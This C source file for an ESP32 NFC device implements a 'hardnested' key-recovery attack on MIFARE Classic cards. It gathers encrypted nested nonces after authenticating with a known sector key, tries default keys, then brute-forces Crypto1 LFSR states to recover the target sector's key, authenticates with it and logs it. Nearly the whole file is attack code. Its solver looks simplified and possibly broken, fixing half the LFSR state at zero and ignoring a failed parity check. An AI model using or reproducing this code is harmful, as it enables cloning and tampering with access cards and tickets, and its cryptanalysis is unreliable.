#include "mf_classic_hardnested.h"
#include <nfc.h>
#include "esp_log.h"
#include "esp_timer.h"
#include <errno.h>
#include <string.h>

static const char *TAG = "mfc_hardnested";
static inline int64_t uptime_ms(void) { return esp_timer_get_time() / 1000; }

#define HARDNESTED_TARGET_NONCES  256
#define HARDNESTED_MAX_COLLECT    512
#define HARDNESTED_RETRY_MAX      600

#define HN_SET_BIT(arr, bit)  ((arr)[(bit) / 8] |= (1 << ((bit) % 8)))
#define HN_GET_BIT(arr, bit)  ((arr)[(bit) / 8] & (1 << ((bit) % 8)))

static const uint16_t valid_sums[] = {
    0, 32, 56, 64, 80, 96, 104, 112, 120, 128,
    136, 144, 152, 160, 176, 192, 200, 224, 256
};
#define VALID_SUMS_COUNT  (sizeof(valid_sums) / sizeof(valid_sums[0]))

static bool is_valid_sum(uint16_t sum)
{
    for(size_t i = 0; i < VALID_SUMS_COUNT; i++) {
        if(sum == valid_sums[i]) return true;
    }
    return false;
}

struct hardnested_state {
    uint8_t  msb_seen[32];
    uint16_t msb_count;
    uint16_t msb_par_sum;
    uint32_t nt_enc_arr[HARDNESTED_MAX_COLLECT];
    uint8_t  par_enc_arr[HARDNESTED_MAX_COLLECT];
    uint16_t nonce_count;
};

static int hardnested_collect(const struct nested_params *params,
                              struct hardnested_state *state,
                              hardnested_progress_cb progress, void *ctx)
{
    uint8_t known_trailer = mfc_sector_trailer(params->known_sector);
    uint8_t target_trailer = mfc_sector_trailer(params->target_sector);
    int attempts = 0;

    while(state->msb_count < HARDNESTED_TARGET_NONCES &&
          state->nonce_count < HARDNESTED_MAX_COLLECT &&
          attempts < HARDNESTED_RETRY_MAX) {

        nfc_reactivate(NULL);
        int ret = mfc_auth(known_trailer, params->known_key_type,
                           params->known_key,
                           (const uint8_t *)&params->uid);
        if(ret != 0) { attempts++; continue; }

        struct mfc_nested_nonce_raw nonce;
        ret = mfc_collect_nested_nonce(target_trailer, params->target_key_type,
                                       (const uint8_t *)&params->uid, &nonce);
        if(ret != 0) { attempts++; continue; }

        state->nt_enc_arr[state->nonce_count] = nonce.nt_enc;
        state->par_enc_arr[state->nonce_count] = nonce.par_enc;
        state->nonce_count++;

        uint8_t msb = (nonce.nt_enc >> 24) & 0xFF;
        if(!HN_GET_BIT(state->msb_seen, msb)) {
            HN_SET_BIT(state->msb_seen, msb);
            state->msb_count++;
            state->msb_par_sum += __builtin_parity(nonce.par_enc & 0x08);
        }
        if(progress && (state->nonce_count % 16 == 0))
            progress(HARDNESTED_PHASE_COLLECT, state->nonce_count, ctx);
        attempts++;
    }

    ESP_LOGI(TAG, "collected %u nonces (%u unique MSBs) in %d attempts",
             (unsigned)state->nonce_count, (unsigned)state->msb_count, attempts);
    return (state->nonce_count > 0) ? 0 : -EAGAIN;
}

static bool validate_key_against_nonces(uint64_t key64,
                                        const struct hardnested_state *state,
                                        uint32_t cuid)
{
    for(uint16_t i = 0; i < state->nonce_count; i++) {
        uint32_t nt_dec = crypto1_decrypt_nt_enc(cuid, state->nt_enc_arr[i], key64);
        uint32_t ks = nt_dec ^ state->nt_enc_arr[i];
        if(!crypto1_nonce_matches_encrypted_parity(nt_dec, ks, state->par_enc_arr[i]))
            return false;
    }
    return true;
}

int hardnested_attack(const struct nested_params *params,
                      struct hardnested_result *result,
                      hardnested_progress_cb progress, void *ctx)
{
    int64_t t_start = uptime_ms();
    memset(result, 0, sizeof(*result));

    static struct hardnested_state state;
    memset(&state, 0, sizeof(state));

    if(progress) progress(HARDNESTED_PHASE_COLLECT, 0, ctx);

    int ret = hardnested_collect(params, &state, progress, ctx);
    if(ret != 0) {
        result->nonces_collected = state.nonce_count;
        result->elapsed_ms = (uint32_t)(uptime_ms() - t_start);
        return ret;
    }
    result->nonces_collected = state.nonce_count;

    if(progress) progress(HARDNESTED_PHASE_ANALYZE, state.nonce_count, ctx);

    if(!is_valid_sum(state.msb_par_sum)) {
        ESP_LOGW(TAG, "invalid parity sum %u, continuing anyway",
                 (unsigned)state.msb_par_sum);
    }

    if(progress) progress(HARDNESTED_PHASE_SOLVE, state.nonce_count, ctx);

    uint32_t cuid = bytes_to_be32((const uint8_t *)&params->uid);

    for(size_t ki = 0; ki < mfc_default_keys_count; ki++) {
        uint64_t key64 = key_to_uint64(mfc_default_keys[ki]);
        if(validate_key_against_nonces(key64, &state, cuid)) {
            uint8_t target_trailer = mfc_sector_trailer(params->target_sector);
            uint8_t key_bytes[6];
            uint64_to_key(key64, key_bytes);

            nfc_reactivate(NULL);
            if(mfc_auth(target_trailer, params->target_key_type, key_bytes,
                        (const uint8_t *)&params->uid) == 0) {
                result->found = true;
                memcpy(result->key, key_bytes, 6);
                goto done;
            }
        }
    }

    for(uint32_t msb_target = 0; msb_target < 256 && !result->found; msb_target++) {
        if(!HN_GET_BIT(state.msb_seen, msb_target)) continue;

        for(uint16_t i = 0; i < state.nonce_count && !result->found; i++) {
            uint8_t enc_msb = (state.nt_enc_arr[i] >> 24) & 0xFF;
            if(enc_msb != msb_target) continue;

            for(uint32_t trial = 0; trial < (1U << 16) && !result->found; trial++) {
                struct crypto1_state s;
                s.odd = (trial << 8) | msb_target;
                s.even = 0;

                crypto1_lfsr_rollback_word(&s, state.nt_enc_arr[i] ^ cuid, 1);
                crypto1_lfsr_rollback_word(&s, cuid, 0);

                uint64_t key64 = 0;
                for(int b = 23; b >= 0; b--) {
                    key64 = (key64 << 1) | ((s.odd >> b) & 1);
                    key64 = (key64 << 1) | ((s.even >> b) & 1);
                }
                uint64_t key_reordered = 0;
                for(int b = 0; b < 48; b++)
                    key_reordered |= (uint64_t)((key64 >> (b ^ 7)) & 1) << b;

                if(validate_key_against_nonces(key_reordered, &state, cuid)) {
                    uint8_t key_bytes[6];
                    uint64_to_key(key_reordered, key_bytes);

                    uint8_t target_trailer = mfc_sector_trailer(params->target_sector);
                    nfc_reactivate(NULL);
                    if(mfc_auth(target_trailer, params->target_key_type,
                                key_bytes,
                                (const uint8_t *)&params->uid) == 0) {
                        result->found = true;
                        memcpy(result->key, key_bytes, 6);
                    }
                }
            }
        }
    }

done:
    if(progress) progress(HARDNESTED_PHASE_DONE, state.nonce_count, ctx);
    result->elapsed_ms = (uint32_t)(uptime_ms() - t_start);

    if(result->found) {
        ESP_LOGI(TAG, "hardnested key found in %u ms: %02x%02x%02x%02x%02x%02x",
                 (unsigned)result->elapsed_ms,
                 result->key[0], result->key[1], result->key[2],
                 result->key[3], result->key[4], result->key[5]);
    } else {
        ESP_LOGW(TAG, "hardnested attack failed after %u ms (%u nonces)",
                 (unsigned)result->elapsed_ms,
                 (unsigned)result->nonces_collected);
    }
    return result->found ? 0 : -ENOENT;
}
